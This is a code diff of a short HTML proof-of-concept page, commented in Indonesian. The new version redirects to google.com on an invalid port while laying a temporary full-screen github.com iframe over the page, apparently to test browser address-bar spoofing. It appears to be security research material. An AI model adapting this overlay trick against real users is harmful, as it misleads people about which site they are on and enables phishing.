@@ -2,61 +2,40 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Delayed Redirect POC</title>
+<title>POC Google Overlay</title>
 <style>
-body { font-family: Arial; text-align: center; margin-top: 80px; }
-button { padding: 16px 32px; font-size: 18px; }
-iframe { width: 90%; height: 300px; border: 1px solid #ccc; margin-top: 20px; display: none; }
+body { font-family: Arial; text-align: center; margin-top: 50px; }
+button { padding: 12px 24px; font-size: 16px; }
 </style>
 </head>
 <body>
-<h2>Safari-Safe POC: Redirect Delay  7 detik</h2>
+<h2>POC: Google URL dengan overlay GitHub sementara</h2>
+<p>Klik tombol untuk mulai POC.</p>
 <button id="start">Start</button>
-<iframe id="panel"></iframe>
 
 <script>
-// Log sederhana
-function logEvent(name, details = {}) {
-    console.log(`[Event] ${name}`, details);
-}
-
 const startBtn = document.getElementById("start");
-const panel = document.getElementById("panel");
 
-// restore iframe dari sessionStorage jika ada
-function restoreIframe() {
-    const html = sessionStorage.getItem("iframeHTML");
-    if(html){
-        panel.style.display = 'block';
-        panel.srcdoc = html;
-        logEvent("iframe_restored");
-    }
-}
-
-window.addEventListener("pageshow", restoreIframe);
-
-// tombol start
 startBtn.onclick = function() {
-    const iframeContent = `<html>
-    <body style="font-family:Arial;text-align:center;margin-top:60px;">
-        <h3>Lifecycle Frame</h3>
-        <p>Konten langsung tampil sebelum redirect.</p>
-        <p>Redirect akan terjadi dalam 7 detik...</p>
-    </body>
-    </html>`;
+    // Step 1: redirect ke google.com
+    window.location.replace("https://google.com:0000");
 
-    sessionStorage.setItem("iframeHTML", iframeContent);
+    // Step 2: buat overlay sementara
+    const overlay = document.createElement('iframe');
+    overlay.src = "https://github.com";
+    overlay.style.position = "fixed";
+    overlay.style.top = 0;
+    overlay.style.left = 0;
+    overlay.style.width = "100%";
+    overlay.style.height = "100%";
+    overlay.style.border = "none";
+    overlay.id = "githubOverlay";
+    document.body.appendChild(overlay);
 
-    // tampilkan iframe langsung
-    panel.style.display = 'block';
-    panel.srcdoc = iframeContent;
-    logEvent("iframe_shown", { newPath: location.pathname });
-
-    // delay 7 detik sebelum redirect ke google.com
-    logEvent("redirect_scheduled", { delay: 7000, target: "https://google.com" });
+    // Step 3: hapus overlay setelah 7 detik
     setTimeout(() => {
-        logEvent("redirect_triggered", { target: "https://google.com" });
-        window.location.href = "https://google.com:9090";
+        const o = document.getElementById("githubOverlay");
+        if(o) o.remove();
     }, 7000);
 };
 </script>
